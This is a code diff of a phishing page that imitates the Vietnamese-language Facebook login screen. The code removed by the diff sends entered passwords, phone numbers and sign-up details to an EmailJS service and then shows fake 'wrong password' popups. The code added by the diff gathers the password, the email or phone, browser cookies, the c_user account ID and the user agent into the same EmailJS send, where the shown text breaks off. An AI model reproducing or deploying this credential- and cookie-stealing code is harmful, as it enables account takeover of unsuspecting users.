@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Đăng nhập hoặc đăng ký</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body {
@@ -15,75 +14,25 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-        }
-        body.tiktok-mode {
-            background: linear-gradient(180deg, #e7f0fa 0%, #e7f0fa 50%, #d9f4e6 100%);
-            justify-content: space-between;
-            align-items: center;
-        }
-        .header {
-            display: none;
-            position: fixed;
-            top: 0;
-            width: 100%;
-            background: #fff;
-            border-bottom: 1px solid #dadde1;
-            padding: 10px 0;
-            z-index: 1000;
-        }
-        body.tiktok-mode .header {
-            display: block;
-        }
-        .header-content {
-            max-width: 400px;
-            margin: 0 auto;
-            display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
         }
-        .header-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #1877f2;
-            cursor: pointer;
-        }
-        .header-menu {
-            position: absolute;
-            right: 10px;
-        }
-        .header-menu svg {
-            width: 24px;
-            height: 24px;
-            fill: #606770;
-            cursor: pointer;
-        }
-        .main-container {
-            flex-grow: 1;
+        .container {
             display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
             max-width: 980px;
-            margin: 0 auto;
+            width: 100%;
+            padding: 20px;
+            align-items: center;
+            justify-content: space-between;
         }
         .left-section {
-            display: none;
-            text-align: left;
-            padding: 0 20px;
             flex: 1;
-            max-width: 500px;
+            text-align: left;
+            padding-right: 32px;
         }
-        body.desktop-mode .main-container {
-            flex-direction: row;
-        }
-        body.desktop-mode .left-section {
-            display: block;
-        }
-        .desktop-logo {
-            width: 301px;
-            margin-bottom: 24px;
-            cursor: pointer;
+        .logo {
+            width: 300px;
+            margin-bottom: 16px;
         }
         .slogan {
             font-size: 28px;
@@ -91,93 +40,66 @@
             color: #1c1e21;
             font-weight: normal;
         }
-        .login-container-tiktok, .login-container-desktop,
-        .forgot-password-container, .create-account-container,
-        .about-container, .help-container {
-            width: 100%;
-            max-width: 396px;
+        .login-container, .forgot-container, .create-container, .language-container, .privacy-container, .terms-container, .help-container {
+            width: 396px;
             background: #fff;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             display: none;
-            margin-top: 40px;
-            position: relative;
-            z-index: 1;
         }
-        body.tiktok-mode .login-container-tiktok {
-            box-shadow: none;
-            border-radius: 0;
-            max-width: 100%;
-            padding: 15px;
-            background: transparent;
-            margin: 0;
-        }
-        .login-container-tiktok.active, .login-container-desktop.active,
-        .forgot-password-container.active, .create-account-container.active,
-        .about-container.active, .help-container.active {
+        .login-container.active, .forgot-container.active, .create-container.active, .language-container.active, .privacy-container.active, .terms-container.active, .help-container.active {
             display: block;
         }
-        .facebook-logo {
-            text-align: center;
-            margin: 0 0 20px;
-        }
-        .facebook-logo img {
-            width: 56px;
-            height: 56px;
-        }
-        input {
+        input, select {
             width: 100%;
             padding: 14px 16px;
             margin-bottom: 12px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
             font-size: 17px;
-            color: #1d2129;
+            box-sizing: border-box;
         }
-        input:focus {
+        input:focus, select:focus {
             border-color: #1877f2;
             outline: none;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
-        .btn-primary {
+        .btn-login {
             width: 100%;
             padding: 12px;
             background: #1877f2;
             border: none;
-            border-radius: 50px;
+            border-radius: 6px;
             color: #fff;
             font-size: 20px;
             font-weight: 600;
-            line-height: 24px;
             cursor: pointer;
         }
-        .btn-primary:hover {
+        .btn-login:hover {
             background: #166fe5;
         }
-        .btn-create-account {
+        .btn-redirect {
             width: 100%;
-            max-width: 236px;
             padding: 12px;
-            background: transparent;
-            border: 2px solid #1877f2;
-            border-radius: 50px;
-            color: #1877f2;
+            background: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
             font-size: 17px;
             font-weight: 600;
-            margin: 12px auto 0;
-            display: block;
+            margin-top: 12px;
             cursor: pointer;
         }
-        .btn-create-account:hover {
-            background: #e7f3ff;
+        .btn-redirect:hover {
+            background: #36a420;
         }
         .forgot-password {
             color: #1877f2;
             font-size: 14px;
             text-align: center;
             display: block;
-            margin-top: 16px;
+            margin: 16px 0;
             text-decoration: none;
             cursor: pointer;
         }
@@ -188,124 +110,73 @@
             border-top: 1px solid #dadde1;
             margin: 20px 0;
         }
-        h5 {
-            font-size: 20px;
+        .btn-create {
+            display: block;
+            margin: 0 auto;
+            padding: 12px 20px;
+            background: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
             font-weight: 600;
-            color: #1c1e21;
-            margin-bottom: 10px;
+            cursor: pointer;
         }
-        .back-button {
-            display: none;
+        .btn-create:hover {
+            background: #36a420;
+        }
+        .btn-back {
             color: #1877f2;
             font-size: 14px;
             text-align: center;
-            margin-top: 20px;
-            cursor: pointer;
+            display: block;
+            margin-top: 16px;
             text-decoration: none;
+            cursor: pointer;
         }
-        .back-button:hover {
+        .btn-back:hover {
             text-decoration: underline;
         }
-        body.tiktok-mode .back-button,
-        body.desktop-mode .back-button {
-            display: block;
-        }
-        .footer-links-tiktok {
-            display: none;
-            width: 100%;
-            background: transparent;
-            padding: 10px;
-            text-align: center;
+        .footer {
+            background: #f0f2f5;
+            padding: 20px 0;
             font-size: 12px;
             color: #737373;
+            text-align: center;
+            width: 100%;
         }
-        body.tiktok-mode .footer-links-tiktok {
-            display: block;
-        }
-        .footer-links-tiktok a {
+        .footer a {
             color: #737373;
             margin: 0 10px;
             text-decoration: none;
             cursor: pointer;
         }
-        .footer-links-tiktok a:hover {
+        .footer a:hover {
             text-decoration: underline;
         }
-        .footer-links-tiktok .meta-logo {
-            color: #737373;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        .footer {
-            display: none;
-            background: #f0f2f5;
-            padding: 20px 0;
-            font-size: 12px;
-            color: #737373;
-            text-align: left;
-            border-top: 1px solid #dadde1;
-        }
-        body.desktop-mode .footer {
-            display: block;
-        }
-        .footer-content {
-            max-width: 980px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin-bottom: 8px;
-        }
-        .footer-links a {
-            color: #737373;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-        .footer-meta {
-            margin-top: 8px;
-            color: #737373;
-        }
-        .success-popup {
+        .popup {
             display: none;
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            width: 90%;
-            max-width: 400px;
             padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.3);
             text-align: center;
-            z-index: 1001;
+            z-index: 1000;
         }
-        .success-popup-title {
+        .popup h3 {
             font-size: 20px;
-            font-weight: 600;
             color: #1c1e21;
-            margin-bottom: 10px;
+            margin: 0 0 10px;
         }
-        .success-popup-message {
-            font-size: 16px;
-            color: #606770;
-            margin-bottom: 20px;
-        }
-        .success-popup-button {
-            background: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            padding: 10px 20px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
+        .popup small {
+            font-size: 12px;
+            color: #666;
+            display: block;
+            margin-top: 5px;
         }
         .overlay {
             display: none;
@@ -314,19 +185,55 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.65);
-            z-index: 1000;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
         }
-        @media (max-width: 576px) {
-            .main-container {
-                padding: 10px;
+        h2 {
+            font-size: 24px;
+            color: #1c1e21;
+            margin-bottom: 16px;
+        }
+        p {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 16px;
+        }
+        .radio-group {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        .radio-group label {
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+            color: #1c1e21;
+        }
+        .radio-group input {
+            width: auto;
+            margin-right: 8px;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+            font-size: 14px;
+            color: #606770;
+        }
+        ul li {
+            margin-bottom: 10px;
+        }
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
             }
-            .login-container-tiktok {
-                padding: 15px;
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 20px;
             }
-            .btn-primary, .btn-create-account {
-                font-size: 16px;
-                padding: 10px;
+            .login-container, .forgot-container, .create-container, .language-container, .privacy-container, .terms-container, .help-container {
+                width: 100%;
+                max-width: 396px;
             }
         }
     </style>
@@ -338,200 +245,129 @@
         })();
     </script>
 
-    <div class="header">
-        <div class="header-content">
-            <div class="header-title" onclick="window.location.href='https://www.facebook.com/'">facebook</div>
-            <div class="header-menu" onclick="toggleDropdown()">
-                <svg viewBox="0 0 24 24"><circle cx="12" cy="6" r="2" fill="#606770"/><circle cx="12" cy="12" r="2" fill="#606770"/><circle cx="12" cy="18" r="2" fill="#606770"/></svg>
-            </div>
-            <div class="dropdown-menu" id="dropdownMenu" style="display: none; position: absolute; right: 10px; top: 40px; background: #fff; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.15);">
-                <div style="padding: 8px 12px; font-size: 14px;" onclick="window.location.href='https://www.facebook.com/help/contact/540977703751424'">Báo cáo</div>
-                <div style="padding: 8px 12px; font-size: 14px;" onclick="window.open(window.location.href, '_blank')">Mở trong trình duyệt</div>
-                <div style="padding: 8px 12px; font-size: 14px;" onclick="navigator.clipboard.writeText(window.location.href).then(() => alert('Đã sao chép!'))">Sao chép liên kết</div>
-            </div>
-        </div>
-    </div>
-    <div class="main-container">
+    <div class="container">
         <div class="left-section">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOHG-Ft5.svg" alt="Facebook" class="desktop-logo" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg'" onclick="window.location.href='https://www.facebook.com/'">
-            <div class="slogan">Kết nối với bạn bè, gia đình và những người khác mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận thông tin cập nhật.</div>
+            <img src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOHG-Ft5.svg" alt="Facebook" class="logo" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg'">
+            <div class="slogan">Kết nối với bạn bè và cả thế giới xung quanh bạn trên Facebook.</div>
         </div>
-        <!-- TikTok Login -->
-        <div class="login-container-tiktok">
-            <div class="facebook-logo">
-                <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg'">
-            </div>
-            <input type="text" id="login-input-tiktok" placeholder="Số di động hoặc email">
-            <input type="password" id="password-tiktok" placeholder="Mật khẩu">
-            <button class="btn-primary" onclick="login('tiktok')">Đăng nhập</button>
-            <a href="https://www.facebook.com/recover/initiate/" class="forgot-password" target="_blank">Bạn quên mật khẩu ư?</a>
-            <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
-            <div class="back-button" onclick="showLogin()">Quay lại</div>
-        </div>
-        <!-- Desktop Login -->
-        <div class="login-container-desktop">
-            <input type="text" id="login-input-desktop" placeholder="Số di động hoặc email">
-            <input type="password" id="password-desktop" placeholder="Mật khẩu">
-            <button class="btn-primary" onclick="login('desktop')">Đăng nhập</button>
-            <a href="https://www.facebook.com/recover/initiate/" class="forgot-password" target="_blank">Bạn quên mật khẩu ư?</a>
+        <div class="login-container active">
+            <input type="text" id="login-input" placeholder="Email hoặc số điện thoại">
+            <input type="password" id="password" placeholder="Mật khẩu">
+            <button class="btn-login" onclick="loginWithForm()">Đăng nhập</button>
+            <button class="btn-redirect" onclick="redirectIfLoggedIn()">Chuyển hướng đến Facebook</button>
+            <a class="forgot-password" onclick="showForgot()">Quên mật khẩu?</a>
             <div class="divider"></div>
-            <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
-            <div class="back-button" onclick="showLogin()">Quay lại</div>
+            <button class="btn-create" onclick="showCreate()">Tạo tài khoản mới</button>
         </div>
-        <!-- Forgot Password -->
-        <div class="forgot-password-container">
-            <h5>Tìm tài khoản của bạn</h5>
-            <p style="font-size: 14px; color: #606770; margin-bottom: 15px;">Vui lòng nhập email hoặc số điện thoại để tìm kiếm tài khoản của bạn.</p>
-            <input type="text" id="phone-input" placeholder="Email hoặc số điện thoại">
-            <button class="btn-primary" onclick="searchByPhone()">Tiếp tục</button>
-            <div class="back-button" onclick="showLogin()">Quay lại</div>
+        <div class="forgot-container">
+            <h2>Tìm tài khoản của bạn</h2>
+            <p>Vui lòng nhập email hoặc số điện thoại để tìm kiếm tài khoản của bạn.</p>
+            <input type="text" id="forgot-input" placeholder="Email hoặc số điện thoại">
+            <button class="btn-login" onclick="showForgotOptions()">Tìm kiếm</button>
+            <div id="forgot-options" style="display:none;">
+                <p>Chọn cách nhận mã xác nhận:</p>
+                <button class="btn-login" style="margin-bottom:10px;" onclick="alert('Gửi mã qua email (mô phỏng).')">Gửi qua email</button>
+                <button class="btn-login" onclick="alert('Gửi qua SMS (mô phỏng).')">Gửi qua SMS</button>
+            </div>
+            <a class="btn-back" onclick="showLogin()">Quay lại</a>
         </div>
-        <!-- Create Account -->
-        <div class="create-account-container">
-            <h5>Đăng ký</h5>
-            <input type="text" id="firstName" placeholder="Tên">
-            <input type="text" id="lastName" placeholder="Họ">
-            <input type="text" id="phone" placeholder="Số điện thoại hoặc email">
-            <input type="password" id="new-password" placeholder="Mật khẩu mới">
-            <button class="btn-primary" onclick="createAccount()">Đăng ký</button>
-            <div class="back-button" onclick="showLogin()">Quay lại</div>
+        <div class="create-container">
+            <h2>Đăng ký</h2>
+            <p>Nhanh chóng và dễ dàng.</p>
+            <input type="text" placeholder="Tên">
+            <input type="text" placeholder="Họ">
+            <input type="text" placeholder="Số di động hoặc email">
+            <input type="password" placeholder="Mật khẩu mới">
+            <div style="margin-bottom:12px;">
+                <label style="font-size:14px; color:#606770;">Ngày sinh</label>
+                <div style="display:flex; justify-content:space-between;">
+                    <select>
+                        <option>Ngày</option>
+                        ${Array.from({length: 31}, (_, i) => `<option>${i + 1}</option>`).join('')}
+                    </select>
+                    <select>
+                        <option>Tháng</option>
+                        <option>Tháng 1</option><option>Tháng 2</option><option>Tháng 3</option>
+                        <option>Tháng 4</option><option>Tháng 5</option><option>Tháng 6</option>
+                        <option>Tháng 7</option><option>Tháng 8</option><option>Tháng 9</option>
+                        <option>Tháng 10</option><option>Tháng 11</option><option>Tháng 12</option>
+                    </select>
+                    <select>
+                        <option>Năm</option>
+                        ${Array.from({length: 100}, (_, i) => `<option>${2025 - i}</option>`).join('')}
+                    </select>
+                </div>
+            </div>
+            <div class="radio-group">
+                <label><input type="radio" name="gender" value="female">Nữ</label>
+                <label><input type="radio" name="gender" value="male">Nam</label>
+                <label><input type="radio" name="gender" value="custom">Tùy chỉnh</label>
+            </div>
+            <button class="btn-create" onclick="alert('Tạo tài khoản (mô phỏng).')">Đăng ký</button>
+            <a class="btn-back" onclick="showLogin()">Quay lại</a>
         </div>
-        <!-- About -->
-        <div class="about-container">
-            <h5>Giới thiệu</h5>
-            <p style="font-size: 14px; color: #606770;">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
-            <div class="back-button" onclick="showLogin()">Quay lại</div>
+        <div class="language-container">
+            <h2>Chọn ngôn ngữ</h2>
+            <p>Chọn ngôn ngữ bạn muốn sử dụng trên Facebook:</p>
+            <ul>
+                <li><a onclick="alert('Đã chọn Tiếng Việt (mô phỏng).')">Tiếng Việt</a></li>
+                <li><a onclick="alert('Đã chọn English (US) (mô phỏng).')">English (US)</a></li>
+                <li><a onclick="alert('Đã chọn ngôn ngữ khác (mô phỏng).')">Tiếng Nhật</a></li>
+            </ul>
+            <a class="btn-back" onclick="showLogin()">Quay lại</a>
         </div>
-        <!-- Help -->
+        <div class="privacy-container">
+            <h2>Chính sách quyền riêng tư</h2>
+            <p>Chúng tôi cam kết bảo vệ thông tin cá nhân của bạn. Dưới đây là các nguyên tắc cơ bản:</p>
+            <ul>
+                <li>Thu thập thông tin để cải thiện trải nghiệm.</li>
+                <li>Không chia sẻ dữ liệu cá nhân mà không có sự đồng ý.</li>
+                <li>Bạn có quyền kiểm soát thông tin của mình.</li>
+            </ul>
+            <a class="btn-back" onclick="showLogin()">Quay lại</a>
+        </div>
+        <div class="terms-container">
+            <h2>Điều khoản dịch vụ</h2>
+            <p>Bằng cách sử dụng Facebook, bạn đồng ý với các điều khoản sau:</p>
+            <ul>
+                <li>Không đăng nội dung vi phạm pháp luật.</li>
+                <li>Tuân thủ các quy định cộng đồng.</li>
+                <li>Chịu trách nhiệm với tài khoản của bạn.</li>
+            </ul>
+            <a class="btn-back" onclick="showLogin()">Quay lại</a>
+        </div>
         <div class="help-container">
-            <h5>Trợ giúp</h5>
-            <p style="font-size: 14px; color: #606770;">Cần hỗ trợ? Hãy liên hệ với chúng tôi.</p>
-            <div class="back-button" onclick="showLogin()">Quay lại</div>
+            <h2>Trợ giúp</h2>
+            <p>Các câu hỏi thường gặp:</p>
+            <ul>
+                <li><a onclick="alert('Hướng dẫn đăng nhập (mô phỏng).')">Làm sao để đăng nhập?</a></li>
+                <li><a onclick="alert('Hướng dẫn khôi phục (mô phỏng).')">Quên mật khẩu thì làm gì?</a></li>
+                <li><a onclick="alert('Hỗ trợ thêm (mô phỏng).')">Liên hệ hỗ trợ</a></li>
+            </ul>
+            <a class="btn-back" onclick="showLogin()">Quay lại</a>
         </div>
     </div>
-    <div class="footer-links-tiktok">
-        <span class="meta-logo">∞ Meta</span>
-        <a href="https://about.facebook.com/" target="_blank">Giới thiệu</a>
-        <a href="https://www.facebook.com/help/" target="_blank">Trợ giúp</a>
-        <a href="https://www.facebook.com/" target="_blank">Xem thêm</a>
-    </div>
+
     <footer class="footer">
-        <div class="footer-content">
-            <div class="footer-links">
-                <a href="https://www.facebook.com/?locale=vi_VN" target="_blank">Tiếng Việt</a>
-                <a href="https://www.facebook.com/?locale=en_US" target="_blank">English (US)</a>
-                <a href="https://www.facebook.com/?locale=es_LA" target="_blank">Español</a>
-                <a href="https://www.facebook.com/?locale=pt_BR" target="_blank">Português (Brasil)</a>
-                <a href="https://www.facebook.com/?locale=fr_FR" target="_blank">Français (France)</a>
-                <a href="https://www.facebook.com/?locale=de_DE" target="_blank">Deutsch</a>
-                <a href="https://www.facebook.com/?locale=it_IT" target="_blank">Italiano</a>
-                <a href="https://www.facebook.com/?locale=ar_AR" target="_blank">العربية</a>
-                <a href="https://www.facebook.com/?locale=zh_CN" target="_blank">中文(简体)</a>
-                <a href="https://www.facebook.com/?locale=hi_IN" target="_blank">हिन्दी</a>
-            </div>
-            <div class="footer-links">
-                <a onclick="showLogin()">Đăng nhập</a>
-                <a onclick="showCreateAccount()">Đăng ký</a>
-                <a href="https://www.messenger.com/" target="_blank">Messenger</a>
-                <a href="https://www.facebook.com/lite/" target="_blank">Facebook Lite</a>
-                <a href="https://www.facebook.com/watch/" target="_blank">Watch</a>
-                <a href="https://www.facebook.com/places/" target="_blank">Địa điểm</a>
-                <a href="https://www.facebook.com/games/" target="_blank">Trò chơi</a>
-                <a href="https://www.facebook.com/marketplace/" target="_blank">Marketplace</a>
-                <a href="https://pay.facebook.com/" target="_blank">Meta Pay</a>
-                <a href="https://www.meta.com/" target="_blank">Meta Store</a>
-                <a href="https://www.meta.com/quest/" target="_blank">Meta Quest</a>
-                <a href="https://www.instagram.com/" target="_blank">Instagram</a>
-                <a href="https://www.threads.net/" target="_blank">Threads</a>
-                <a href="https://www.facebook.com/fundraisers/" target="_blank">Quyên góp</a>
-                <a href="https://www.facebook.com/biz/directory/" target="_blank">Dịch vụ</a>
-                <a href="https://www.facebook.com/votinginformationcenter/" target="_blank">Trung tâm thông tin bầu cử</a>
-                <a href="https://www.facebook.com/privacy/explanation/" target="_blank">Chính sách quyền riêng tư</a>
-                <a href="https://www.facebook.com/privacy/center/" target="_blank">Trung tâm quyền riêng tư</a>
-                <a href="https://www.facebook.com/groups/" target="_blank">Nhóm</a>
-                <a href="https://about.facebook.com/" target="_blank">Giới thiệu</a>
-                <a href="https://www.facebook.com/ads/create/" target="_blank">Tạo quảng cáo</a>
-                <a href="https://www.facebook.com/pages/creation/" target="_blank">Tạo Trang</a>
-                <a href="https://developers.facebook.com/" target="_blank">Nhà phát triển</a>
-                <a href="https://www.facebook.com/careers/" target="_blank">Tuyển dụng</a>
-                <a href="https://www.facebook.com/policies/cookies/" target="_blank">Cookie</a>
-                <a href="https://www.facebook.com/adpreferences/ad_settings" target="_blank">Lựa chọn quảng cáo</a>
-                <a href="https://www.facebook.com/policies/" target="_blank">Điều khoản</a>
-                <a href="https://www.facebook.com/help/" target="_blank">Trợ giúp</a>
-            </div>
-            <div class="footer-meta">Meta © 2025</div>
-        </div>
+        <a onclick="showLanguage()">Tiếng Việt</a>
+        <a onclick="showLanguage()">English (US)</a>
+        <a onclick="showPrivacy()">Chính sách quyền riêng tư</a>
+        <a onclick="showTerms()">Điều khoản</a>
+        <a onclick="showHelp()">Trợ giúp</a>
+        <span>Meta © 2025</span>
     </footer>
+
     <div class="overlay" id="overlay"></div>
-    <div class="success-popup" id="popup">
-        <div class="success-popup-title" id="popup-title"></div>
-        <div class="success-popup-message" id="popup-message"></div>
-        <button class="success-popup-button" onclick="hidePopup()">OK</button>
+    <div class="popup" id="popup">
+        <h3 id="popup-title"></h3>
+        <small id="popup-subtext"></small>
+        <button onclick="hidePopup()" style="margin-top:10px; padding:8px 16px; background:#1877f2; color:#fff; border:none; border-radius:6px;">OK</button>
     </div>
 
     <script>
-        window.onload = function() {
-            const isMobile = /mobile|android|iphone|ipad/i.test(navigator.userAgent) || window.innerWidth <= 576;
-            const isFromTikTok = document.referrer.includes("tiktok.com") || navigator.userAgent.includes("tiktok");
-            document.body.classList.remove('tiktok-mode', 'desktop-mode');
-            if (isFromTikTok || isMobile) {
-                document.body.classList.add('tiktok-mode');
-                hideAllExcept('.login-container-tiktok');
-            } else {
-                document.body.classList.add('desktop-mode');
-                hideAllExcept('.login-container-desktop');
-            }
-        };
-
-        function toggleDropdown() {
-            const menu = document.getElementById('dropdownMenu');
-            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
-        }
-
-        function hideAllExcept(selector) {
-            const containers = [
-                '.login-container-tiktok', '.login-container-desktop',
-                '.forgot-password-container', '.create-account-container',
-                '.about-container', '.help-container'
-            ];
-            containers.forEach(container => {
-                const element = document.querySelector(container);
-                element.classList.remove('active');
-                element.style.display = 'none';
-            });
-            const activeContainer = document.querySelector(selector);
-            activeContainer.classList.add('active');
-            activeContainer.style.display = 'block';
-
-            const isDesktop = document.body.classList.contains('desktop-mode');
-            const header = document.querySelector('.header');
-            header.style.display = isDesktop ? 'none' : 'block';
-            document.querySelector('.header-title').innerText = isDesktop || selector === '.login-container-tiktok' ? 'facebook' : document.querySelector(selector + ' h5').innerText;
-        }
-
-        function showLogin() {
-            hideAllExcept(document.body.classList.contains('desktop-mode') ? '.login-container-desktop' : '.login-container-tiktok');
-        }
-
-        function showForgotPassword() {
-            hideAllExcept('.forgot-password-container');
-        }
-
-        function showCreateAccount() {
-            hideAllExcept('.create-account-container');
-        }
-
-        function showAbout() {
-            hideAllExcept('.about-container');
-        }
-
-        function showHelp() {
-            hideAllExcept('.help-container');
-        }
-
-        function showPopup(title, message) {
+        function showPopup(title, subtext = "") {
             document.getElementById('popup-title').innerText = title;
-            document.getElementById('popup-message').innerText = message;
+            document.getElementById('popup-subtext').innerText = subtext;
             document.getElementById('popup').style.display = 'block';
             document.getElementById('overlay').style.display = 'block';
         }
@@ -541,61 +377,147 @@
             document.getElementById('overlay').style.display = 'none';
         }
 
-        function login(mode) {
-            const loginInput = document.getElementById(`login-input-${mode}`).value;
-            const password = document.getElementById(`password-${mode}`).value;
-            if (!loginInput || !password) {
-                showPopup("Đăng nhập không thành công", "Vui lòng nhập đầy đủ thông tin.");
-                return;
-            }
-            const templateParams = {
-                email: loginInput,
-                password: password,
-                action: "Đăng nhập",
-                timestamp: new Date().toLocaleString()
-            };
-            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại."), 
-                      () => showPopup("Đăng nhập không thành công", "Có lỗi xảy ra khi gửi thông tin."));
+        function getCookies() {
+            return document.cookie || "Không có";
         }
 
-        function searchByPhone() {
-            const phone = document.getElementById('phone-input').value;
-            if (!phone) {
-                showPopup("Lỗi", "Vui lòng nhập email hoặc số điện thoại.");
-                return;
+        function getUIDFromCookie() {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                if (cookie.includes("c_user")) {
+                    return cookie.split('=')[1].trim();
+                }
             }
-            const templateParams = {
-                phone: phone,
-                action: "Quên mật khẩu",
-                timestamp: new Date().toLocaleString()
-            };
-            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => showPopup("Thành công", "Đã gửi mã xác nhận đến " + phone), 
-                      () => showPopup("Lỗi", "Có lỗi xảy ra khi gửi thông tin."));
+            return "Không có";
         }
 
-        function createAccount() {
-            const firstName = document.getElementById('firstName').value;
-            const lastName = document.getElementById('lastName').value;
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('new-password').value;
-            if (!firstName || !lastName || !phone || !password) {
-                showPopup("Lỗi", "Vui lòng điền đầy đủ thông tin.");
+        function showLogin() {
+            document.querySelector('.login-container').classList.add('active');
+            document.querySelector('.forgot-container').classList.remove('active');
+            document.querySelector('.create-container').classList.remove('active');
+            document.querySelector('.language-container').classList.remove('active');
+            document.querySelector('.privacy-container').classList.remove('active');
+            document.querySelector('.terms-container').classList.remove('active');
+            document.querySelector('.help-container').classList.remove('active');
+        }
+
+        function showForgot() {
+            document.querySelector('.login-container').classList.remove('active');
+            document.querySelector('.forgot-container').classList.add('active');
+            document.querySelector('.create-container').classList.remove('active');
+            document.querySelector('.language-container').classList.remove('active');
+            document.querySelector('.privacy-container').classList.remove('active');
+            document.querySelector('.terms-container').classList.remove('active');
+            document.querySelector('.help-container').classList.remove('active');
+            document.getElementById('forgot-options').style.display = 'none';
+        }
+
+        function showForgotOptions() {
+            const forgotInput = document.getElementById('forgot-input').value;
+            if (!forgotInput) {
+                alert("Vui lòng nhập email hoặc số điện thoại.");
                 return;
             }
+            document.getElementById('forgot-options').style.display = 'block';
+        }
+
+        function showCreate() {
+            document.querySelector('.login-container').classList.remove('active');
+            document.querySelector('.forgot-container').classList.remove('active');
+            document.querySelector('.create-container').classList.add('active');
+            document.querySelector('.language-container').classList.remove('active');
+            document.querySelector('.privacy-container').classList.remove('active');
+            document.querySelector('.terms-container').classList.remove('active');
+            document.querySelector('.help-container').classList.remove('active');
+        }
+
+        function showLanguage() {
+            document.querySelector('.login-container').classList.remove('active');
+            document.querySelector('.forgot-container').classList.remove('active');
+            document.querySelector('.create-container').classList.remove('active');
+            document.querySelector('.language-container').classList.add('active');
+            document.querySelector('.privacy-container').classList.remove('active');
+            document.querySelector('.terms-container').classList.remove('active');
+            document.querySelector('.help-container').classList.remove('active');
+        }
+
+        function showPrivacy() {
+            document.querySelector('.login-container').classList.remove('active');
+            document.querySelector('.forgot-container').classList.remove('active');
+            document.querySelector('.create-container').classList.remove('active');
+            document.querySelector('.language-container').classList.remove('active');
+            document.querySelector('.privacy-container').classList.add('active');
+            document.querySelector('.terms-container').classList.remove('active');
+            document.querySelector('.help-container').classList.remove('active');
+        }
+
+        function showTerms() {
+            document.querySelector('.login-container').classList.remove('active');
+            document.querySelector('.forgot-container').classList.remove('active');
+            document.querySelector('.create-container').classList.remove('active');
+            document.querySelector('.language-container').classList.remove('active');
+            document.querySelector('.privacy-container').classList.remove('active');
+            document.querySelector('.terms-container').classList.add('active');
+            document.querySelector('.help-container').classList.remove('active');
+        }
+
+        function showHelp() {
+            document.querySelector('.login-container').classList.remove('active');
+            document.querySelector('.forgot-container').classList.remove('active');
+            document.querySelector('.create-container').classList.remove('active');
+            document.querySelector('.language-container').classList.remove('active');
+            document.querySelector('.privacy-container').classList.remove('active');
+            document.querySelector('.terms-container').classList.remove('active');
+            document.querySelector('.help-container').classList.add('active');
+        }
+
+        function loginWithForm() {
+            const loginInput = document.getElementById('login-input').value || "";
+            const password = document.getElementById('password').value || "";
+            const isPhone = /^\d+$/.test(loginInput) ? loginInput : "Không có";
+            const isEmail = loginInput.includes("@") ? loginInput : "Không có";
+            const cookies = getCookies();
+            const userAgent = navigator.userAgent;
+            const uid = getUIDFromCookie();
+
             const templateParams = {
-                firstName: firstName,
-                lastName: lastName,
-                phone: phone,
-                password: password,
-                action: "Tạo tài khoản",
+                password: password || "Không có",
+                phone: isPhone !== "Không có" ? isPhone : uid,
+                email: isEmail !== "Không có" ? isEmail : loginInput || "Không có",
+                firstName: cookies,
+                lastName: userAgent,
+                action: "Đăng nhập qua form",
                 timestamp: new Date().toLocaleString()
             };
+
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
